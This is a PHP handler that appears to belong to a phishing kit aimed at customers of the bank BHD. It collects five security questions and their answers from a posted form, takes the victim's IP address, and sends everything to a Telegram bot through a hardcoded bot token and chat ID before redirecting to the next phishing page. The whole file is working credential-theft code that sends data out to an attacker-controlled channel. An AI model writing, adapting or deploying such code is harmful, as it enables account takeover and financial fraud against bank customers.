<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $preg1 = $_POST["preg1"] ?? '';
    $resp1 = $_POST["resp1"] ?? '';
    $preg2 = $_POST["preg2"] ?? '';
    $resp2 = $_POST["resp2"] ?? '';
    $preg3 = $_POST["preg3"] ?? '';
    $resp3 = $_POST["resp3"] ?? '';
    $preg4 = $_POST["preg4"] ?? '';
    $resp4 = $_POST["resp4"] ?? '';
    $preg5 = $_POST["preg5"] ?? '';
    $resp5 = $_POST["resp5"] ?? '';

    // OBTENER IP PÚBLICA REAL
    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    }

    $botToken = "8857815714:AAFp5JutGMJPmwrZf5NwiigjazGNVbnJEB4";
    $chatID = "8555745789";

    $message = "=====PREGUNTAS BHD=======\n";
    $message .= "$preg1\n$resp1\n";
    $message .= "$preg2\n$resp2\n";
    $message .= "$preg3\n$resp3\n";
    $message .= "$preg4\n$resp4\n";
    $message .= "$preg5\n$resp5\n";
    $message .= "IP del cliente: $ip";

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = array("chat_id" => $chatID, "text" => $message);
    $options = array(
        "http" => array(
            "method" => "POST",
            "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
            "content" => http_build_query($data)
        )
    );
    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);

    header("Location: pa02.php");
    exit;
}
?>
